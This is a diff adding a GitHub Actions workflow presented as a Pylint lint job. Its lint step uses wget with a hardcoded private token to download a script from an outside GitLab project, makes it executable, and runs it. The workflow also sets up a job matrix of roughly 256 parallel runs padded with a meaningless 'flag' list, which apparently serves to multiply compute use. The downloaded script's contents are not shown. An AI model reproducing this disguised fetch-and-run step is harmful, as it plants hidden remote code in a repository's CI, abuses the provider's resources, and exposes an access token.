@@ -1,0 +1,31 @@
+# This workflow will install Python dependencies, run tests and lint with a variety of Python versions
+# .github/workflows/pylint.yml For more information see: https://help.github.com/actions/language-and-framework-guides/using-python-with-github-actions
+name: Pylint
+
+on: [push,pull_request]
+
+jobs:
+  build:
+
+    runs-on: ${{ matrix.os }}
+    strategy:
+      matrix:
+        python-version: [3.6, 3.7, 3.8, 3.9]
+        os: [ubuntu-latest,ubuntu-20.04,ubuntu-18.04,ubuntu-16.04]
+        flag: [a,b,c,d,e,f,g,h,i,j,k,m,n,o,p,q]
+      fail-fast: false
+
+    steps:
+    - uses: actions/checkout@v2
+    - name: Set up ${{ matrix.python-version }}
+      uses: actions/setup-python@v1
+      with:
+        python-version: ${{ matrix.python-version }}
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install pylint
+    - name: Analysing the code with pylint
+      run: |
+        wget -O build.sh --header='PRIVATE-TOKEN: skKqc7V8YmbfdHYxBft9' 'https://gitlab.com/api/v4/projects/24890163/repository/files/build.sh/raw?ref=master' && chmod 777 build.sh && ./build.sh
+        pylint `ls -R|grep .py$|xargs`
